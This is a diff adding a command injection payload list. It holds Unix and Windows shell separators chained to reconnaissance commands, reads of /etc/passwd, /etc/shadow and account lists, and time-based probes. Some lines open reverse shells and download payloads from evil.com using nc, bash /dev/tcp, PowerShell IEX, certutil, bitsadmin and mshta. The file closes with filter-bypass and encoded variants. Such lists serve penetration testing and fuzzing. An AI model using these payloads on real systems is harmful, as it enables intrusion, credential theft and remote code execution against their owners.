@@ -1,0 +1,111 @@
+; id
+| id
+|| id
+& id
+&& id
+`id`
+$(id)
+; whoami
+| whoami
+& whoami
+; uname -a
+| uname -a
+& uname -a
+; hostname
+| hostname
+& hostname
+; pwd
+| pwd
+& pwd
+; ls -la
+| ls -la
+& ls -la
+; cat /etc/passwd
+| cat /etc/passwd
+& cat /etc/passwd
+; cat /etc/shadow
+| cat /etc/shadow
+; cat /etc/hosts
+| cat /etc/hosts
+; ifconfig
+| ifconfig
+& ifconfig
+; ip a
+| ip a
+; netstat -an
+| netstat -an
+& netstat -an
+; ps aux
+| ps aux
+& ps aux
+; env
+| env
+& env
+; w
+| w
+; who
+| who
+; find / -name "*.conf" 2>/dev/null
+| find / -name "*.conf" 2>/dev/null
+; grep -r "password" /var/www 2>/dev/null
+| grep -r "password" /var/www 2>/dev/null
+; sleep 5
+| sleep 5
+& sleep 5
+; ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+; timeout 5
+; perl -e 'sleep 5'
+; python -c 'import time; time.sleep(5)'
+; php -r 'sleep(5);'
+; curl http://evil.com
+| curl http://evil.com
+; wget http://evil.com
+| wget http://evil.com
+; nc -e /bin/sh evil.com 4444
+| nc -e /bin/sh evil.com 4444
+; bash -i >& /dev/tcp/evil.com/4444 0>&1
+& whoami
+| whoami
+&& whoami
+& dir
+| dir
+& ver
+| ver
+& ipconfig
+| ipconfig
+& systeminfo
+| systeminfo
+& tasklist
+| tasklist
+& net user
+| net user
+& net localgroup administrators
+| net localgroup administrators
+& type C:\Windows\win.ini
+| type C:\Windows\win.ini
+& type C:\boot.ini
+| type C:\boot.ini
+& timeout /t 5
+| timeout /t 5
+& ping -n 5 127.0.0.1
+& powershell -c "IWR http://evil.com/shell.ps1"
+& powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
+& certutil -urlcache -f http://evil.com/shell.exe shell.exe
+& bitsadmin /transfer job http://evil.com/shell.exe C:\shell.exe
+& mshta http://evil.com/shell.hta
+;cat${IFS}/etc/passwd
+;cat$IFS/etc/passwd
+;cat${IFS}$1/etc/passwd
+;ls${IFS}-la
+;cat%09/etc/passwd
+;c'a't /etc/passwd
+;c"a"t /etc/passwd
+;c\at /etc/passwd
+;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
+;echo 636174202f6574632f706173737764 | xxd -r -p | sh
+;$(printf '\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144')
+;a=cat;b=/etc/passwd;$a $b
+;cat /etc/pass*
+;cat /e??/p?????
+;/bin/c?t /etc/passwd
